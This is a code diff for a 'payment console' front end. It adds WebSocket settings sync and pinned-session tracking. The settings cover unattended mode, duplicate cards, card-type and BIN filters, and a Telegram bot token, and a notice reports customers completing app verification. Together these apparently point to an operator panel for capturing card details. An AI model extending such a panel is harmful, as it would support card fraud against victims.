@@ -154,6 +154,17 @@ const { connected, sendAction, ws } = usePaymentWs({
   onAppVerifyDone: (data) => {
     const s = sessions.find(s => s.id === data.sessionId);
     window.$message?.success(`客户已完成APP验证${s ? ' - 会话'+s.sessionId : ''}`, { duration: 5000 });
+  },
+  onServerSettings: (data) => {
+    const cur = JSON.parse(localStorage.getItem('payment_console_settings') || '{}');
+    const globalKeys = ['unattendedMode','unattendedSeconds','allowDuplicateCard','cardTypeFilter','autoRejectBins','tgBotToken','tgChatId'];
+    for (const k of globalKeys) {
+      if (data[k] !== undefined) {
+        if (k === 'autoRejectBins' && Array.isArray(data[k])) data[k] = data[k].join(',');
+        cur[k] = data[k];
+      }
+    }
+    localStorage.setItem('payment_console_settings', JSON.stringify(cur));
   }
 });
 
@@ -200,12 +211,19 @@ function handleSettingsChanged(settings: any) {
     return;
   }
 
+  // Send only global settings to server
   if (ws.value?.readyState === WebSocket.OPEN) {
-    ws.value.send(JSON.stringify({ type: 'update_settings', payload: settings }));
+    const globalKeys = ['unattendedMode','unattendedSeconds','allowDuplicateCard','cardTypeFilter','autoRejectBins'];
+    const payload: any = {};
+    for (const k of globalKeys) if (settings[k] !== undefined) payload[k] = settings[k];
+    ws.value.send(JSON.stringify({ type: 'update_settings', payload }));
   } else {
     const retry = setInterval(() => {
       if (ws.value?.readyState === WebSocket.OPEN) {
-        ws.value.send(JSON.stringify({ type: 'update_settings', payload: settings }));
+        const globalKeys = ['unattendedMode','unattendedSeconds','allowDuplicateCard','cardTypeFilter','autoRejectBins'];
+        const payload: any = {};
+        for (const k of globalKeys) if (settings[k] !== undefined) payload[k] = settings[k];
+        ws.value.send(JSON.stringify({ type: 'update_settings', payload }));
         clearInterval(retry);
       }
     }, 500);
@@ -213,12 +231,16 @@ function handleSettingsChanged(settings: any) {
   }
 }
 
+const _pinnedIds = new Set<string>();
+
 async function refreshSessions() {
   try {
+    for (const s of sessions) { if ((s as any).pinned) _pinnedIds.add(s.id); }
     const res = await fetch('/api/payment/sessions');
     const json = await res.json();
     if (json.code === '0000') {
       const filtered = applyFilters(json.data);
+      for (const s of filtered) { if (_pinnedIds.has(s.id)) (s as any).pinned = true; }
       sessions.splice(0, sessions.length, ...filtered);
       window.$message?.success('已刷新');
     }
